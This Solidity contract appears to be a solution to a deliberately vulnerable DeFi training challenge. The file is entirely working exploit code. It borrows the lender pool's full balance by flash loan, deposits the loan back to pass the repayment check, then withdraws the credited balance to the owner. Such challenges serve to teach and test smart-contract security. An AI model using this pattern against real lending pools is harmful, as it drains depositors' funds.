// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";
import {ISideEntranceLenderPool} from "./ISideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker is
    IFlashLoanEtherReceiver,
    Ownable2Step
{
    ISideEntranceLenderPool private immutable i_lenderPool;

    error CallerIsNotLenderPool();
    error WithdrawFailed();

    event FundsWithdrawn(address to, uint256 amount);

    constructor(address _lenderPool) Ownable2Step() {
        i_lenderPool = ISideEntranceLenderPool(_lenderPool);
    }

    receive() external payable {}

    function execute() external payable {
        if (msg.sender != address(i_lenderPool)) {
            revert CallerIsNotLenderPool();
        }
        i_lenderPool.deposit{value: msg.value}();
    }

    function exploit() external onlyOwner {
        i_lenderPool.flashLoan(address(i_lenderPool).balance);
        i_lenderPool.withdraw();
        _withdraw(msg.sender);
    }

    function _withdraw(address _to) private {
        uint256 amount = address(this).balance;
        (bool success, ) = _to.call{value: amount}("");
        if (!success) {
            revert WithdrawFailed();
        }
        emit FundsWithdrawn(_to, amount);
    }
}
